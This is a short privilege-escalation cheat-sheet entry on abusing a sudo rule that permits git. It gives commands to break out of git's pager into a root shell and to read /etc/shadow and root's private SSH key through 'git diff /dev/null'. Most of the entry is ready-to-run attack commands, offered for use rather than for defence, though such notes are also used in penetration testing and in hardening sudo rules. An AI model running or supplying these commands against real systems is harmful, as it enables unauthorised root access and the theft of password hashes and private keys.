# sudo git Pager Escape + Arbitrary File Read

If sudo allows `git` (even a narrow subcommand like `diff --help`), git can drop into a pager (`less`) that escapes to a shell, or read arbitrary files via `diff`.

```bash
sudo git --no-pager diff --help   # some git builds still invoke the pager here; from the pager: !/bin/sh

# or, more reliably, arbitrary file read as root:
sudo git --no-pager diff /dev/null /etc/shadow
sudo git --no-pager diff /dev/null /root/.ssh/id_rsa
```
